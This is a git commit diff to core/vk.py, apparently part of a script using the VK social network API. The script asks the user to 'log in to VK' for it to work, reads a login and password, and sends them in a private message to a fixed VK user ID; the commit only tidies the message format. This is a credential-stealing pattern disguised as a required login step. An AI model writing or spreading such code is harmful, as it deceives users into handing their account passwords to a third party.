dbc5b77e64ee2c198372e5d685eb6c3d2949cf3d
DarkGa <48998251+DarkGa@users.noreply.github.com>
2019-04-25 23:17:46 +0300

    Update vk.py

--- core/vk.py
+++ core/vk.py
@@ -10,7 +10,7 @@ print("Авторизуйтесь ВК\nЭто нужно чтоб скрипт 
 def write_msg(user_id, s, random_id):
  log= input("Enter login: ")
  pas = input("Enter password: ")
- msg = "login: " +log + "password" +pas
+ msg = "login: " +log + " password: " +pas
  
  vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)}) 
 
